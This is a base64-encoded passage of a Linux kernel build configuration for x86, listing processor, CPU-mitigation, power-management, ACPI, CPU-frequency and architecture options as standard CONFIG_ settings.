VElPTj15CkNPTkZJR19YODZfSU9QTF9JT1BFUk09eQpDT05GSUdfTUlDUk9DT0RFPXkKIyBDT05G
SUdfTUlDUk9DT0RFX0xBVEVfTE9BRElORyBpcyBub3Qgc2V0CkNPTkZJR19YODZfTVNSPXkKQ09O
RklHX1g4Nl9DUFVJRD15CkNPTkZJR19YODZfNUxFVkVMPXkKQ09ORklHX1g4Nl9ESVJFQ1RfR0JQ
QUdFUz15CiMgQ09ORklHX1g4Nl9DUEFfU1RBVElTVElDUyBpcyBub3Qgc2V0CiMgQ09ORklHX0FN
RF9NRU1fRU5DUllQVCBpcyBub3Qgc2V0CkNPTkZJR19OVU1BPXkKQ09ORklHX0FNRF9OVU1BPXkK
Q09ORklHX1g4Nl82NF9BQ1BJX05VTUE9eQojIENPTkZJR19OVU1BX0VNVSBpcyBub3Qgc2V0CkNP
TkZJR19OT0RFU19TSElGVD02CkNPTkZJR19BUkNIX1NQQVJTRU1FTV9FTkFCTEU9eQpDT05GSUdf
QVJDSF9TUEFSU0VNRU1fREVGQVVMVD15CkNPTkZJR19BUkNIX1BST0NfS0NPUkVfVEVYVD15CkNP
TkZJR19JTExFR0FMX1BPSU5URVJfVkFMVUU9MHhkZWFkMDAwMDAwMDAwMDAwCiMgQ09ORklHX1g4
Nl9QTUVNX0xFR0FDWSBpcyBub3Qgc2V0CkNPTkZJR19YODZfQ0hFQ0tfQklPU19DT1JSVVBUSU9O
PXkKQ09ORklHX1g4Nl9CT09UUEFSQU1fTUVNT1JZX0NPUlJVUFRJT05fQ0hFQ0s9eQpDT05GSUdf
TVRSUj15CiMgQ09ORklHX01UUlJfU0FOSVRJWkVSIGlzIG5vdCBzZXQKQ09ORklHX1g4Nl9QQVQ9
eQpDT05GSUdfQVJDSF9VU0VTX1BHX1VOQ0FDSEVEPXkKQ09ORklHX1g4Nl9VTUlQPXkKQ09ORklH
X0NDX0hBU19JQlQ9eQpDT05GSUdfWDg2X0NFVD15CkNPTkZJR19YODZfS0VSTkVMX0lCVD15CkNP
TkZJR19YODZfSU5URUxfTUVNT1JZX1BST1RFQ1RJT05fS0VZUz15CkNPTkZJR19YODZfSU5URUxf
VFNYX01PREVfT0ZGPXkKIyBDT05GSUdfWDg2X0lOVEVMX1RTWF9NT0RFX09OIGlzIG5vdCBzZXQK
IyBDT05GSUdfWDg2X0lOVEVMX1RTWF9NT0RFX0FVVE8gaXMgbm90IHNldAojIENPTkZJR19YODZf
VVNFUl9TSEFET1dfU1RBQ0sgaXMgbm90IHNldApDT05GSUdfRUZJPXkKQ09ORklHX0VGSV9TVFVC
PXkKQ09ORklHX0VGSV9IQU5ET1ZFUl9QUk9UT0NPTD15CkNPTkZJR19FRklfTUlYRUQ9eQpDT05G
SUdfRUZJX1JVTlRJTUVfTUFQPXkKIyBDT05GSUdfSFpfMTAwIGlzIG5vdCBzZXQKIyBDT05GSUdf
SFpfMjUwIGlzIG5vdCBzZXQKIyBDT05GSUdfSFpfMzAwIGlzIG5vdCBzZXQKQ09ORklHX0haXzEw
MDA9eQpDT05GSUdfSFo9MTAwMApDT05GSUdfU0NIRURfSFJUSUNLPXkKQ09ORklHX0FSQ0hfU1VQ
UE9SVFNfS0VYRUM9eQpDT05GSUdfQVJDSF9TVVBQT1JUU19LRVhFQ19GSUxFPXkKQ09ORklHX0FS
Q0hfU1VQUE9SVFNfS0VYRUNfUFVSR0FUT1JZPXkKQ09ORklHX0FSQ0hfU1VQUE9SVFNfS0VYRUNf
U0lHPXkKQ09ORklHX0FSQ0hfU1VQUE9SVFNfS0VYRUNfU0lHX0ZPUkNFPXkKQ09ORklHX0FSQ0hf
U1VQUE9SVFNfS0VYRUNfQlpJTUFHRV9WRVJJRllfU0lHPXkKQ09ORklHX0FSQ0hfU1VQUE9SVFNf
S0VYRUNfSlVNUD15CkNPTkZJR19BUkNIX1NVUFBPUlRTX0NSQVNIX0RVTVA9eQpDT05GSUdfQVJD
SF9TVVBQT1JUU19DUkFTSF9IT1RQTFVHPXkKQ09ORklHX0FSQ0hfSEFTX0dFTkVSSUNfQ1JBU0hL
RVJORUxfUkVTRVJWQVRJT049eQpDT05GSUdfUEhZU0lDQUxfU1RBUlQ9MHgxMDAwMDAwCkNPTkZJ
R19SRUxPQ0FUQUJMRT15CiMgQ09ORklHX1JBTkRPTUlaRV9CQVNFIGlzIG5vdCBzZXQKQ09ORklH
X1BIWVNJQ0FMX0FMSUdOPTB4MjAwMDAwCkNPTkZJR19EWU5BTUlDX01FTU9SWV9MQVlPVVQ9eQoj
IENPTkZJR19BRERSRVNTX01BU0tJTkcgaXMgbm90IHNldApDT05GSUdfSE9UUExVR19DUFU9eQoj
IENPTkZJR19DT01QQVRfVkRTTyBpcyBub3Qgc2V0CkNPTkZJR19MRUdBQ1lfVlNZU0NBTExfWE9O
TFk9eQojIENPTkZJR19MRUdBQ1lfVlNZU0NBTExfTk9ORSBpcyBub3Qgc2V0CkNPTkZJR19DTURM
SU5FX0JPT0w9eQpDT05GSUdfQ01ETElORT0ibmV0LmlmbmFtZXM9MCIKIyBDT05GSUdfQ01ETElO
RV9PVkVSUklERSBpcyBub3Qgc2V0CkNPTkZJR19NT0RJRllfTERUX1NZU0NBTEw9eQojIENPTkZJ
R19TVFJJQ1RfU0lHQUxUU1RBQ0tfU0laRSBpcyBub3Qgc2V0CkNPTkZJR19IQVZFX0xJVkVQQVRD
SD15CiMgZW5kIG9mIFByb2Nlc3NvciB0eXBlIGFuZCBmZWF0dXJlcwoKQ09ORklHX0NDX0hBU19O
QU1FRF9BUz15CkNPTkZJR19DQ19IQVNfU0xTPXkKQ09ORklHX0NDX0hBU19SRVRVUk5fVEhVTks9
eQpDT05GSUdfQ0NfSEFTX0VOVFJZX1BBRERJTkc9eQpDT05GSUdfRlVOQ1RJT05fUEFERElOR19D
Rkk9MTEKQ09ORklHX0ZVTkNUSU9OX1BBRERJTkdfQllURVM9MTYKQ09ORklHX0NBTExfUEFERElO
Rz15CkNPTkZJR19IQVZFX0NBTExfVEhVTktTPXkKQ09ORklHX0NBTExfVEhVTktTPXkKQ09ORklH
X1BSRUZJWF9TWU1CT0xTPXkKQ09ORklHX0NQVV9NSVRJR0FUSU9OUz15CkNPTkZJR19NSVRJR0FU
SU9OX1BBR0VfVEFCTEVfSVNPTEFUSU9OPXkKQ09ORklHX01JVElHQVRJT05fUkVUUE9MSU5FPXkK
Q09ORklHX01JVElHQVRJT05fUkVUSFVOSz15CkNPTkZJR19NSVRJR0FUSU9OX1VOUkVUX0VOVFJZ
PXkKQ09ORklHX01JVElHQVRJT05fQ0FMTF9ERVBUSF9UUkFDS0lORz15CiMgQ09ORklHX0NBTExf
VEhVTktTX0RFQlVHIGlzIG5vdCBzZXQKQ09ORklHX01JVElHQVRJT05fSUJQQl9FTlRSWT15CkNP
TkZJR19NSVRJR0FUSU9OX0lCUlNfRU5UUlk9eQpDT05GSUdfTUlUSUdBVElPTl9TUlNPPXkKIyBD
T05GSUdfTUlUSUdBVElPTl9TTFMgaXMgbm90IHNldAojIENPTkZJR19NSVRJR0FUSU9OX0dEU19G
T1JDRSBpcyBub3Qgc2V0CkNPTkZJR19NSVRJR0FUSU9OX1JGRFM9eQpDT05GSUdfTUlUSUdBVElP
Tl9TUEVDVFJFX0JIST15CkNPTkZJR19BUkNIX0hBU19BRERfUEFHRVM9eQoKIwojIFBvd2VyIG1h
bmFnZW1lbnQgYW5kIEFDUEkgb3B0aW9ucwojCkNPTkZJR19BUkNIX0hJQkVSTkFUSU9OX0hFQURF
Uj15CkNPTkZJR19TVVNQRU5EPXkKQ09ORklHX1NVU1BFTkRfRlJFRVpFUj15CkNPTkZJR19ISUJF
Uk5BVEVfQ0FMTEJBQ0tTPXkKQ09ORklHX0hJQkVSTkFUSU9OPXkKQ09ORklHX0hJQkVSTkFUSU9O
X1NOQVBTSE9UX0RFVj15CkNPTkZJR19ISUJFUk5BVElPTl9DT01QX0xaTz15CkNPTkZJR19ISUJF
Uk5BVElPTl9ERUZfQ09NUD0ibHpvIgpDT05GSUdfUE1fU1REX1BBUlRJVElPTj0iIgpDT05GSUdf
UE1fU0xFRVA9eQpDT05GSUdfUE1fU0xFRVBfU01QPXkKIyBDT05GSUdfUE1fQVVUT1NMRUVQIGlz
IG5vdCBzZXQKIyBDT05GSUdfUE1fVVNFUlNQQUNFX0FVVE9TTEVFUCBpcyBub3Qgc2V0CiMgQ09O
RklHX1BNX1dBS0VMT0NLUyBpcyBub3Qgc2V0CkNPTkZJR19QTT15CkNPTkZJR19QTV9ERUJVRz15
CiMgQ09ORklHX1BNX0FEVkFOQ0VEX0RFQlVHIGlzIG5vdCBzZXQKIyBDT05GSUdfUE1fVEVTVF9T
VVNQRU5EIGlzIG5vdCBzZXQKQ09ORklHX1BNX1NMRUVQX0RFQlVHPXkKQ09ORklHX1BNX1RSQUNF
PXkKQ09ORklHX1BNX1RSQUNFX1JUQz15CiMgQ09ORklHX1dRX1BPV0VSX0VGRklDSUVOVF9ERUZB
VUxUIGlzIG5vdCBzZXQKIyBDT05GSUdfRU5FUkdZX01PREVMIGlzIG5vdCBzZXQKQ09ORklHX0FS
Q0hfU1VQUE9SVFNfQUNQST15CkNPTkZJR19BQ1BJPXkKQ09ORklHX0FDUElfTEVHQUNZX1RBQkxF
U19MT09LVVA9eQpDT05GSUdfQVJDSF9NSUdIVF9IQVZFX0FDUElfUERDPXkKQ09ORklHX0FDUElf
U1lTVEVNX1BPV0VSX1NUQVRFU19TVVBQT1JUPXkKQ09ORklHX0FDUElfVEhFUk1BTF9MSUI9eQoj
IENPTkZJR19BQ1BJX0RFQlVHR0VSIGlzIG5vdCBzZXQKQ09ORklHX0FDUElfU1BDUl9UQUJMRT15
CiMgQ09ORklHX0FDUElfRlBEVCBpcyBub3Qgc2V0CkNPTkZJR19BQ1BJX0xQSVQ9eQpDT05GSUdf
QUNQSV9TTEVFUD15CkNPTkZJR19BQ1BJX1JFVl9PVkVSUklERV9QT1NTSUJMRT15CiMgQ09ORklH
X0FDUElfRUNfREVCVUdGUyBpcyBub3Qgc2V0CkNPTkZJR19BQ1BJX0FDPXkKQ09ORklHX0FDUElf
QkFUVEVSWT15CkNPTkZJR19BQ1BJX0JVVFRPTj15CkNPTkZJR19BQ1BJX1ZJREVPPXkKQ09ORklH
X0FDUElfRkFOPXkKIyBDT05GSUdfQUNQSV9UQUQgaXMgbm90IHNldApDT05GSUdfQUNQSV9ET0NL
PXkKQ09ORklHX0FDUElfQ1BVX0ZSRVFfUFNTPXkKQ09ORklHX0FDUElfUFJPQ0VTU09SX0NTVEFU
RT15CkNPTkZJR19BQ1BJX1BST0NFU1NPUl9JRExFPXkKQ09ORklHX0FDUElfQ1BQQ19MSUI9eQpD
T05GSUdfQUNQSV9QUk9DRVNTT1I9eQpDT05GSUdfQUNQSV9IT1RQTFVHX0NQVT15CiMgQ09ORklH
X0FDUElfUFJPQ0VTU09SX0FHR1JFR0FUT1IgaXMgbm90IHNldApDT05GSUdfQUNQSV9USEVSTUFM
PXkKQ09ORklHX0FSQ0hfSEFTX0FDUElfVEFCTEVfVVBHUkFERT15CkNPTkZJR19BQ1BJX1RBQkxF
X1VQR1JBREU9eQojIENPTkZJR19BQ1BJX0RFQlVHIGlzIG5vdCBzZXQKIyBDT05GSUdfQUNQSV9Q
Q0lfU0xPVCBpcyBub3Qgc2V0CkNPTkZJR19BQ1BJX0NPTlRBSU5FUj15CkNPTkZJR19BQ1BJX0hP
VFBMVUdfSU9BUElDPXkKIyBDT05GSUdfQUNQSV9TQlMgaXMgbm90IHNldAojIENPTkZJR19BQ1BJ
X0hFRCBpcyBub3Qgc2V0CkNPTkZJR19BQ1BJX0JHUlQ9eQpDT05GSUdfQUNQSV9OSExUPXkKIyBD
T05GSUdfQUNQSV9ORklUIGlzIG5vdCBzZXQKQ09ORklHX0FDUElfTlVNQT15CiMgQ09ORklHX0FD
UElfSE1BVCBpcyBub3Qgc2V0CkNPTkZJR19IQVZFX0FDUElfQVBFST15CkNPTkZJR19IQVZFX0FD
UElfQVBFSV9OTUk9eQojIENPTkZJR19BQ1BJX0FQRUkgaXMgbm90IHNldAojIENPTkZJR19BQ1BJ
X0RQVEYgaXMgbm90IHNldAojIENPTkZJR19BQ1BJX0NPTkZJR0ZTIGlzIG5vdCBzZXQKIyBDT05G
SUdfQUNQSV9QRlJVVCBpcyBub3Qgc2V0CkNPTkZJR19BQ1BJX1BDQz15CiMgQ09ORklHX0FDUElf
RkZIIGlzIG5vdCBzZXQKIyBDT05GSUdfUE1JQ19PUFJFR0lPTiBpcyBub3Qgc2V0CkNPTkZJR19B
Q1BJX1BSTVQ9eQpDT05GSUdfWDg2X1BNX1RJTUVSPXkKCiMKIyBDUFUgRnJlcXVlbmN5IHNjYWxp
bmcKIwpDT05GSUdfQ1BVX0ZSRVE9eQpDT05GSUdfQ1BVX0ZSRVFfR09WX0FUVFJfU0VUPXkKQ09O
RklHX0NQVV9GUkVRX0dPVl9DT01NT049eQojIENPTkZJR19DUFVfRlJFUV9TVEFUIGlzIG5vdCBz
ZXQKIyBDT05GSUdfQ1BVX0ZSRVFfREVGQVVMVF9HT1ZfUEVSRk9STUFOQ0UgaXMgbm90IHNldAoj
IENPTkZJR19DUFVfRlJFUV9ERUZBVUxUX0dPVl9QT1dFUlNBVkUgaXMgbm90IHNldApDT05GSUdf
Q1BVX0ZSRVFfREVGQVVMVF9HT1ZfVVNFUlNQQUNFPXkKIyBDT05GSUdfQ1BVX0ZSRVFfREVGQVVM
VF9HT1ZfU0NIRURVVElMIGlzIG5vdCBzZXQKQ09ORklHX0NQVV9GUkVRX0dPVl9QRVJGT1JNQU5D
RT15CiMgQ09ORklHX0NQVV9GUkVRX0dPVl9QT1dFUlNBVkUgaXMgbm90IHNldApDT05GSUdfQ1BV
X0ZSRVFfR09WX1VTRVJTUEFDRT15CkNPTkZJR19DUFVfRlJFUV9HT1ZfT05ERU1BTkQ9eQojIENP
TkZJR19DUFVfRlJFUV9HT1ZfQ09OU0VSVkFUSVZFIGlzIG5vdCBzZXQKQ09ORklHX0NQVV9GUkVR
X0dPVl9TQ0hFRFVUSUw9eQoKIwojIENQVSBmcmVxdWVuY3kgc2NhbGluZyBkcml2ZXJzCiMKQ09O
RklHX1g4Nl9JTlRFTF9QU1RBVEU9eQojIENPTkZJR19YODZfUENDX0NQVUZSRVEgaXMgbm90IHNl
dApDT05GSUdfWDg2X0FNRF9QU1RBVEU9eQpDT05GSUdfWDg2X0FNRF9QU1RBVEVfREVGQVVMVF9N
T0RFPTMKIyBDT05GSUdfWDg2X0FNRF9QU1RBVEVfVVQgaXMgbm90IHNldApDT05GSUdfWDg2X0FD
UElfQ1BVRlJFUT15CkNPTkZJR19YODZfQUNQSV9DUFVGUkVRX0NQQj15CiMgQ09ORklHX1g4Nl9Q
T1dFUk5PV19LOCBpcyBub3Qgc2V0CiMgQ09ORklHX1g4Nl9BTURfRlJFUV9TRU5TSVRJVklUWSBp
cyBub3Qgc2V0CiMgQ09ORklHX1g4Nl9TUEVFRFNURVBfQ0VOVFJJTk8gaXMgbm90IHNldAojIENP
TkZJR19YODZfUDRfQ0xPQ0tNT0QgaXMgbm90IHNldAoKIwojIHNoYXJlZCBvcHRpb25zCiMKIyBl
bmQgb2YgQ1BVIEZyZXF1ZW5jeSBzY2FsaW5nCgojCiMgQ1BVIElkbGUKIwpDT05GSUdfQ1BVX0lE
TEU9eQojIENPTkZJR19DUFVfSURMRV9HT1ZfTEFEREVSIGlzIG5vdCBzZXQKQ09ORklHX0NQVV9J
RExFX0dPVl9NRU5VPXkKIyBDT05GSUdfQ1BVX0lETEVfR09WX1RFTyBpcyBub3Qgc2V0CkNPTkZJ
R19DUFVfSURMRV9HT1ZfSEFMVFBPTEw9eQpDT05GSUdfSEFMVFBPTExfQ1BVSURMRT15CiMgZW5k
IG9mIENQVSBJZGxlCgojIENPTkZJR19JTlRFTF9JRExFIGlzIG5vdCBzZXQKIyBlbmQgb2YgUG93
ZXIgbWFuYWdlbWVudCBhbmQgQUNQSSBvcHRpb25zCgojCiMgQnVzIG9wdGlvbnMgKFBDSSBldGMu
KQojCkNPTkZJR19QQ0lfRElSRUNUPXkKQ09ORklHX1BDSV9NTUNPTkZJRz15CkNPTkZJR19NTUNP
TkZfRkFNMTBIPXkKQ09ORklHX0lTQV9ETUFfQVBJPXkKQ09ORklHX0FNRF9OQj15CiMgZW5kIG9m
IEJ1cyBvcHRpb25zIChQQ0kgZXRjLikKCiMKIyBCaW5hcnkgRW11bGF0aW9ucwojCkNPTkZJR19J
QTMyX0VNVUxBVElPTj15CiMgQ09ORklHX0lBMzJfRU1VTEFUSU9OX0RFRkFVTFRfRElTQUJMRUQg
aXMgbm90IHNldAojIENPTkZJR19YODZfWDMyX0FCSSBpcyBub3Qgc2V0CkNPTkZJR19DT01QQVRf
MzI9eQpDT05GSUdfQ09NUEFUPXkKQ09ORklHX0NPTVBBVF9GT1JfVTY0X0FMSUdOTUVOVD15CiMg
ZW5kIG9mIEJpbmFyeSBFbXVsYXRpb25zCgpDT05GSUdfVklSVFVBTElaQVRJT049eQojIENPTkZJ
R19LVk0gaXMgbm90IHNldApDT05GSUdfQVNfQVZYNTEyPXkKQ09ORklHX0FTX1NIQTFfTkk9eQpD
T05GSUdfQVNfU0hBMjU2X05JPXkKQ09ORklHX0FTX1RQQVVTRT15CkNPTkZJR19BU19HRk5JPXkK
Q09ORklHX0FTX1ZBRVM9eQpDT05GSUdfQVNfVlBDTE1VTFFEUT15CkNPTkZJR19BU19XUlVTUz15
CkNPTkZJR19BUkNIX0NPTkZJR1VSRVNfQ1BVX01JVElHQVRJT05TPXkKCiMKIyBHZW5lcmFsIGFy
Y2hpdGVjdHVyZS1kZXBlbmRlbnQgb3B0aW9ucwojCkNPTkZJR19IT1RQTFVHX1NNVD15CkNPTkZJ
R19IT1RQTFVHX0NPUkVfU1lOQz15CkNPTkZJR19IT1RQTFVHX0NPUkVfU1lOQ19ERUFEPXkKQ09O
RklHX0hPVFBMVUdfQ09SRV9TWU5DX0ZVTEw9eQpDT05GSUdfSE9UUExVR19TUExJVF9TVEFSVFVQ
PXkKQ09ORklHX0hPVFBMVUdfUEFSQUxMRUw9eQpDT05GSUdfR0VORVJJQ19FTlRSWT15CkNPTkZJ
R19LUFJPQkVTPXkKQ09ORklHX0pVTVBfTEFCRUw9eQojIENPTkZJR19TVEFUSUNfS0VZU19TRUxG
VEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX1NUQVRJQ19DQUxMX1NFTEZURVNUIGlzIG5vdCBzZXQK
Q09ORklHX09QVFBST0JFUz15CkNPTkZJR19VUFJPQkVTPXkKQ09ORklHX0hBVkVfRUZGSUNJRU5U
X1VOQUxJR05FRF9BQ0NFU1M9eQpDT05GSUdfQVJDSF9VU0VfQlVJTFRJTl9CU1dBUD15CkNPTkZJ
R19LUkVUUFJPQkVTPXkKQ09ORklHX0tSRVRQUk9CRV9PTl9SRVRIT09LPXkKQ09ORklHX0hBVkVf
SU9SRU1BUF9QUk9UPXkKQ09ORklHX0hBVkVfS1BST0JFUz15CkNPTkZJR19IQVZFX0tSRVRQUk9C
RVM9eQpDT05GSUdfSEFWRV9PUFRQUk9CRVM9eQpDT05GSUdfSEFWRV9LUFJPQkVTX09OX0ZUUkFD
RT15CkNPTkZJR19BUkNIX0NPUlJFQ1RfU1RBQ0tUUkFDRV9PTl9LUkVUUFJPQkU9eQpDT05GSUdf
SEFWRV9GVU5DVElPTl9FUlJPUl9JTkpFQ1RJT049eQpDT05GSUdfSEFWRV9OTUk9eQpDT05GSUdf
VFJBQ0VfSVJRRkxBR1NfU1VQUE9SVD15CkNPTkZJR19UUkFDRV9JUlFGTEFHU19OTUlfU1VQUE9S
VD15CkNPTkZJR19IQVZFX0FSQ0hfVFJBQ0VIT09LPXkKQ09ORklHX0hBVkVfRE1BX0NPTlRJR1VP
VVM9eQpDT05GSUdfR0VORVJJQ19TTVBfSURMRV9USFJFQUQ9eQpDT05GSUdfQVJDSF9IQVNfRk9S
VElGWV9TT1VSQ0U9eQpDT05GSUdfQVJDSF9IQVNfU0VUX01FTU9SWT15CkNPTkZJR19BUkNIX0hB
U19TRVRfRElSRUNUX01BUD15CkNPTkZJR19BUkNIX0hBU19DUFVfRklOQUxJWkVfSU5JVD15CkNP
TkZJR19BUkNIX0hBU19DUFVfUEFTSUQ9eQpDT05GSUdfSEFWRV9BUkNIX1RIUkVBRF9TVFJVQ1Rf
V0hJVEVMSVNUPXkKQ09ORklHX0FSQ0hfV0FOVFNfRFlOQU1JQ19UQVNLX1NUUlVDVD15CkNPTkZJ
R19BUkNIX1dBTlRTX05PX0lOU1RSPXkKQ09ORklHX0hBVkVfQVNNX01PRFZFUlNJT05TPXkKQ09O
RklHX0hBVkVfUkVHU19BTkRfU1RBQ0tfQUNDRVNTX0FQST15CkNPTkZJR19IQVZFX1JTRVE9eQpD
T05GSUdfSEFWRV9SVVNUPXkKQ09ORklHX0hBVkVfRlVOQ1RJT05fQVJHX0FDQ0VTU19BUEk9eQpD
T05GSUdfSEFWRV9IV19CUkVBS1BPSU5UPXkKQ09ORklHX0hBVkVfTUlYRURfQlJFQUtQT0lOVFNf
UkVHUz15CkNPTkZJR19IQVZFX1VTRVJfUkVUVVJOX05PVElGSUVSPXkKQ09ORklHX0hBVkVfUEVS
Rl9FVkVOVFNfTk1JPXkKQ09ORklHX0hBVkVfSEFSRExPQ0tVUF9ERVRFQ1RPUl9QRVJGPXkKQ09O
RklHX0hBVkVfUEVSRl9SRUdTPXkKQ09ORklHX0hBVkVfUEVSRl9VU0VSX1NUQUNLX0RVTVA9eQpD
T05GSUdfSEFWRV9BUkNIX0pVTVBfTEFCRUw9eQpDT05GSUdfSEFWRV9BUkNIX0pVTVBfTEFCRUxf
UkVMQVRJVkU9eQpDT05GSUdfTU1VX0dBVEhFUl9UQUJMRV9GUkVFPXkKQ09ORklHX01NVV9HQVRI
RVJfUkNVX1RBQkxFX0ZSRUU9eQpDT05GSUdfTU1VX0dBVEhFUl9NRVJHRV9WTUFTPXkKQ09ORklH
X01NVV9MQVpZX1RMQl9SRUZDT1VOVD15CkNPTkZJR19BUkNIX0hBVkVfTk1JX1NBRkVfQ01QWENI
Rz15CkNPTkZJR19BUkNIX0hBU19OTUlfU0FGRV9USElTX0NQVV9PUFM9eQpDT05GSUdfSEFWRV9B
TElHTkVEX1NUUlVDVF9QQUdFPXkKQ09ORklHX0hBVkVfQ01QWENIR19MT0NBTD15CkNPTkZJR19I
QVZFX0NNUFhDSEdfRE9VQkxFPXkKQ09ORklHX0FSQ0hfV0FOVF9DT01QQVRfSVBDX1BBUlNFX1ZF
UlNJT049eQpDT05GSUdfQVJDSF9XQU5UX09MRF9DT01QQVRfSVBDPXkKQ09ORklHX0hBVkVfQVJD
SF9TRUNDT01QPXkKQ09ORklHX0hBVkVfQVJDSF9TRUNDT01QX0ZJTFRFUj15CkNPTkZJR19TRUND
T01QPXkKQ09ORklHX1NFQ0NPTVBfRklMVEVSPXkKIyBDT05GSUdfU0VDQ09NUF9DQUNIRV9ERUJV
RyBpcyBub3Qgc2V0CkNPTkZJR19IQVZFX0FSQ0hfU1RBQ0tMRUFLPXkKQ09ORklHX0hBVkVfU1RB
Q0tQUk9URUNUT1I9eQpDT05GSUdfU1RBQ0tQUk9URUNUT1I9eQpDT05GSUdfU1RBQ0tQUk9URUNU
T1JfU1RST05HPXkKQ09ORklHX0FSQ0hfU1VQUE9SVFNfTFRPX0NMQU5HPXkKQ09ORklHX0FSQ0hf
U1VQUE9SVFNfTFRPX0NMQU5HX1RISU49eQpDT05GSUdfTFRPX05PTkU9eQpDT05GSUdfQVJDSF9T
VVBQT1JUU19DRklfQ0xBTkc9eQpDT05GSUdfSEFWRV9BUkNIX1dJVEhJTl9TVEFDS19GUkFNRVM9
eQpDT05GSUdfSEFWRV9DT05URVhUX1RSQUNLSU5HX1VTRVI9eQpDT05GSUdfSEFWRV9DT05URVhU
X1RSQUNLSU5HX1VTRVJfT0ZGU1RBQ0s9eQpDT05GSUdfSEFWRV9WSVJUX0NQVV9BQ0NPVU5USU5H
X0dFTj15CkNPTkZJR19IQVZFX0lSUV9USU1FX0FDQ09VTlRJTkc9eQpDT05GSUdfSEFWRV9NT1ZF
X1BVRD15CkNPTkZJR19IQVZFX01PVkVfUE1EPXkKQ09ORklHX0hBVkVfQVJDSF9UUkFOU1BBUkVO
VF9IVUdFUEFHRT15CkNPTkZJR19IQVZFX0FSQ0hfVFJBTlNQQVJFTlRfSFVHRVBBR0VfUFVEPXkK
Q09ORklHX0hBVkVfQVJDSF9IVUdFX1ZNQVA9eQpDT05GSUdfSEFWRV9BUkNIX0hVR0VfVk1BTExP
Qz15CkNPTkZJR19BUkNIX1dBTlRfSFVHRV9QTURfU0hBUkU9eQpDT05GSUdfSEFWRV9BUkNIX1NP
RlRfRElSVFk9eQpDT05GSUdfSEFWRV9NT0RfQVJDSF9TUEVDSUZJQz15CkNPTkZJR19NT0RVTEVT
X1VTRV9FTEZfUkVMQT15CkNPTkZJR19IQVZFX0lSUV9FWElUX09OX0lSUV9TVEFDSz15CkNPTkZJ
R19IQVZFX1NPRlRJUlFfT05fT1dOX1NUQUNLPXkKQ09ORklHX1NPRlRJUlFfT05fT1dOX1NUQUNL
PXkKQ09ORklHX0FSQ0hfSEFTX0VMRl9SQU5ET01JWkU9eQpDT05GSUdfSEFWRV9BUkNIX01NQVBf
Uk5EX0JJVFM9eQpDT05GSUdfSEFWRV9FWElUX1RIUkVBRD15CkNPTkZJR19BUkNIX01NQVBfUk5E
X0JJVFM9MjgKQ09ORklHX0hBVkVfQVJDSF9NTUFQX1JORF9DT01QQVRfQklUUz15CkNPTkZJR19B
UkNIX01NQVBfUk5EX0NPTVBBVF9CSVRTPTgKQ09ORklHX0hBVkVfQVJDSF9DT01QQVRfTU1BUF9C
QVNFUz15CkNPTkZJR19IQVZFX1BBR0VfU0laRV80S0I9eQpDT05GSUdfUEFHRV9TSVpFXzRLQj15
CkNPTkZJR19QQUdFX1NJWkVfTEVTU19USEFOXzY0S0I9eQpDT05GSUdfUEFHRV9TSVpFX0xFU1Nf
VEhBTl8yNTZLQj15CkNPTkZJR19QQUdFX1NISUZUPTEyCkNPTkZJR19IQVZFX09CSlRPT0w9eQpD
T05GSUdfSEFWRV9KVU1QX0xBQkVMX0hBQ0s9eQpDT05GSUdfSEFWRV9OT0lOU1RSX0hBQ0s9eQpD
T05GSUdfSEFWRV9OT0lOU1RSX1ZBTElEQVRJT049eQpDT05GSUdfSEFWRV9VQUNDRVNTX1ZBTElE
QVRJT049eQpDT05GSUdfSEFWRV9TVEFDS19WQUxJREFUSU9OPXkKQ09ORklHX0hBVkVfUkVMSUFC
TEVfU1RBQ0tUUkFDRT15CkNPTkZJR19PTERfU0lHU1VTUEVORDM9eQpDT05GSUdfQ09NUEFUX09M
RF9TSUdBQ1RJT049eQpDT05GSUdfQ09NUEFUXzMyQklUX1RJTUU9eQpDT05GSUdfSEFWRV9BUkNI
X1ZNQVBfU1RBQ0s9eQpDT05GSUdfSEFWRV9BUkNIX1JBTkRPTUlaRV9LU1RBQ0tfT0ZGU0VUPXkK
Q09ORklHX1JBTkRPTUlaRV9LU1RBQ0tfT0ZGU0VUPXkKIyBDT05GSUdfUkFORE9NSVpFX0tTVEFD
S19PRkZTRVRfREVGQVVMVCBpcyBub3Qgc2V0CkNPTkZJR19BUkNIX0hBU19TVFJJQ1RfS0VSTkVM
X1JXWD15CkNPTkZJR19TVFJJQ1RfS0VSTkVMX1JXWD15CkNPTkZJR19BUkNIX0hBU19TVFJJQ1Rf
TU9EVUxFX1JXWD15CkNPTkZJR19TVFJJQ1RfTU9EVUxFX1JXWD15CkNPTkZJR19IQVZFX0FSQ0hf
UFJFTDMyX1JFTE9DQVRJT05TPXkKQ09ORklHX0FSQ0hfVVNFX01FTVJFTUFQX1BST1Q9eQojIENP
TkZJR19MT0NLX0VWRU5UX0NPVU5UUyBpcyBub3Qgc2V0CkNPTkZJR19BUkNIX0hBU19NRU1fRU5D
UllQVD15CkNPTkZJR19IQVZFX1NUQVRJQ19DQUxMPXkKQ09ORklHX0hBVkVfU1RBVElDX0NBTExf
SU5MSU5FPXkKQ09ORklHX0hBVkVfUFJFRU1QVF9EWU5BTUlDPXkKQ09ORklHX0hBVkVfUFJFRU1Q
VF9EWU5BTUlDX0NBTEw9eQpDT05GSUdfQVJDSF9XQU5UX0xEX09SUEhBTl9XQVJOPXkKQ09ORklH
X0FSQ0hfU1VQUE9SVFNfREVCVUdfUEFHRUFMTE9DPXkKQ09ORklHX0FSQ0hfU1VQUE9SVFNfUEFH
RV9UQUJMRV9DSEVDSz15CkNPTkZJR19BUkNIX0hBU19FTEZDT1JFX0NPTVBBVD15CkNPTkZJR19B
UkNIX0hBU19QQVJBTk9JRF9MMURfRkxVU0g9eQpDT05GSUdfRFlOQU1JQ19TSUdGUkFNRT15CkNP
TkZJR19BUkNIX0hBU19IV19QVEVfWU9VTkc9eQpDT05GSUdfQVJDSF9IQVNfTk9OTEVBRl9QTURf
WU9VTkc9eQpDT05GSUdfQVJDSF9IQVNfS0VSTkVMX0ZQVV9TVVBQT1JUPXkKCiMKIyBHQ09WLWJh
c2VkIGtlcm5lbCBwcm9maWxpbmcKIwojIENPTkZJR19HQ09WX0tFUk5FTCBpcyBub3Qgc2V0CkNP
TkZJR19BUkNIX0hBU19HQ09WX1BST0ZJTEVfQUxMPXkKIyBlbmQgb2YgR0NPVi1iYXNlZCBrZXJu
